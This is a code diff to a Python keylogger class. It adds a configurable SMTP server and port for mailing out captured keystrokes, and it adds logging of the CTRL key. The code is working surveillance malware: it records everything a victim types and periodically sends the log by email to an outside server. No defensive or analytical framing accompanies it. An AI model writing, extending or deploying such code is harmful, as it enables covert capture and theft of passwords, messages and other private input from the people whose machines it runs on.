@@ -7,11 +7,13 @@ import smtplib
 
 class Keylogger:
 
-    def __init__(self, time_interval, email, password):
+    def __init__(self, time_interval, email, password, custom_smtp, smtp_port):
         self.log = "Keylogger Started"
         self.interval = time_interval
         self.email = email
         self.password = password
+        self.custom_smtp = custom_smtp
+        self.smtp_port = smtp_port
         self.start()
 
     def append_to_log(self, string):
@@ -73,6 +75,8 @@ class Keylogger:
                 current_key = " |<LEFT| "
             elif key == key.right:
                 current_key = " |RIGHT>| "
+            elif key == key.ctrl:
+                current_key = " |CTRL| "
             else:
                 current_key = " " + str(key) + " "
         self.append_to_log(current_key)
@@ -84,7 +88,7 @@ class Keylogger:
         timer.start()
 
     def send_mail(self, email, password, message):
-        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server = smtplib.SMTP(self.custom_smtp, int(self.smtp_port))
         server.starttls()
         server.login(email, password)
         server.sendmail(email, email, message)
